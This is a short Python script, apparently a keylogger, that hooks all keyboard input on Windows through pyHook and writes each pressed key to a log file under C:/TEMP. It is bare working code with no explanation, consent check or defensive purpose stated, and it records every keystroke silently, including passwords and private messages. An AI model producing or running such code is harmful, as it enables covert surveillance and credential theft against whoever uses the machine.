import pythoncom, pyHook, logging, os.path

def OnKeyboardEvent(event):
    logging.warning(str(event.Key))
    return True

if not os.path.exists('C:/TEMP'):
    os.makedirs('C:/TEMP')
    open('C:/TEMP/log.log','a').close()

logging.basicConfig(filename='C:/TEMP/log.log',format='%(message)s')

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
